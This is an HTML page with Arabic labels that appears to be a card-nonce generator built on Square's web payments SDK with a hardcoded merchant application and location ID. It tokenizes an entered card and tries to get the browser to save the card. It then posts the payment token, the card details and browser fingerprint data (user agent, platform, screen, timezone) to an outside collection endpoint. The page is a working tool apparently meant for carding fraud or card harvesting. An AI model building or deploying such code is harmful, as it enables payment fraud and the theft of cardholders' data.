<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="manifest" href="manifest.json">
<title>Square Auto</title>
<script src="https://web.squarecdn.com/v1/square.js"></script>
<style>
  body { font-family: monospace; padding: 12px; background:#f7f7f7; }
  input, button { font-size: 16px; padding: 10px; width: 100%; margin: 6px 0; box-sizing: border-box; }
  button { background:#0066cc; color:#fff; border:none; border-radius:6px; }
  button.green { background:#0a7d2c; }
  pre { background:#fff; padding:10px; border:1px solid #ccc; font-size:11px; max-height:200px; overflow:auto; white-space:pre-wrap; }
  .log { background:#222; color:#0f0; padding:8px; font-size:11px; max-height:150px; overflow:auto; }
  .status { padding:10px; border-radius:6px; font-size:14px; margin:10px 0; }
  .on { background:#d4f7d4; border:2px solid #0a7d2c; }
  .off { background:#f7d4d4; border:2px solid #a00; }
  .warn { background:#fff3cd; border:2px solid #f0c000; }
  #card-container { margin: 10px 0; }
</style>
</head>
<body>

<div id="status" class="status warn">⏳ جاري التهيئة...</div>

<div id="card-container"></div>

<button id="gen" disabled class="green">توليد cnon</button>

<h3>آخر cnon</h3>
<pre id="out">بانتظار...</pre>

<h3>السجل</h3>
<div class="log" id="log">...</div>

<script>
const APP_ID = "sq0idp-wGVapF8sNt9PLrdj5znuKA";
const LOC_ID = "LRBWS2ZYH9DE3";
const SAVE_URL = "https://shope.ct.ws/save.php";

const logEl = document.getElementById("log");
function log(m) {
  logEl.textContent = new Date().toLocaleTimeString() + " — " + m + "\n" + logEl.textContent;
}

let card;

(async () => {
  try {
    const payments = Square.payments(APP_ID, LOC_ID);

    // محاولة تفعيل autocomplete (Chrome يحفظ البطاقة بعد أول مرة)
    try {
      card = await payments.card({
        autocomplete: true,
      });
      log("✓ card() مع autocomplete");
    } catch (e) {
      card = await payments.card();
      log("⚠ card() بدون autocomplete");
    }

    await card.attach("#card-container");
    log("✓ card.attach() نجح");

    document.getElementById("gen").disabled = false;
    document.getElementById("status").className = "status on";
    document.getElementById("status").textContent = "✓ جاهز — أدخل البطاقة واضغط توليد (Chrome سيحفظها)";

  } catch (e) {
    log("✗ تهيئة فشلت: " + (e.message || e));
    document.getElementById("status").className = "status off";
    document.getElementById("status").textContent = "✗ فشل التهيئة";
  }
})();

document.getElementById("gen").onclick = async () => {
  const btn = document.getElementById("gen");
  btn.disabled = true;
  btn.textContent = "جاري التوليد...";
  document.getElementById("status").textContent = "⏳ جاري التوليد...";

  try {
    const result = await card.tokenize();
    if (result.status !== "OK") {
      log("✗ tokenize: " + result.status);
      document.getElementById("status").className = "status off";
      document.getElementById("status").textContent = "✗ فشل التوليد — تحقق من البطاقة";
      btn.disabled = false;
      btn.textContent = "توليد cnon";
      return;
    }

    const payload = {
      status: result.status,
      token: result.token,
      card: result.details,
      user_agent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: [screen.width, screen.height],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      tz_offset: new Date().getTimezoneOffset(),
      generated_at: new Date().toISOString(),
    };

    document.getElementById("out").textContent = JSON.stringify(payload, null, 2);

    const res = await fetch(SAVE_URL, {
      method: "POST",
      body: JSON.stringify(payload),
    });
    if (!res.ok) throw new Error("HTTP " + res.status);

    const url = (await res.text()).trim();
    log("✓ رُفع: " + url);

    document.getElementById("status").className = "status on";
    document.getElementById("status").textContent = "✓ تم — " + new Date().toLocaleTimeString();

    localStorage.setItem("last_url", url);

  } catch (e) {
    log("✗ " + (e.message || e));
    document.getElementById("status").className = "status off";
    document.getElementById("status").textContent = "✗ فشل الرفع";
  } finally {
    btn.disabled = false;
    btn.textContent = "توليد cnon";
  }
};
</script>
</body>
</html>
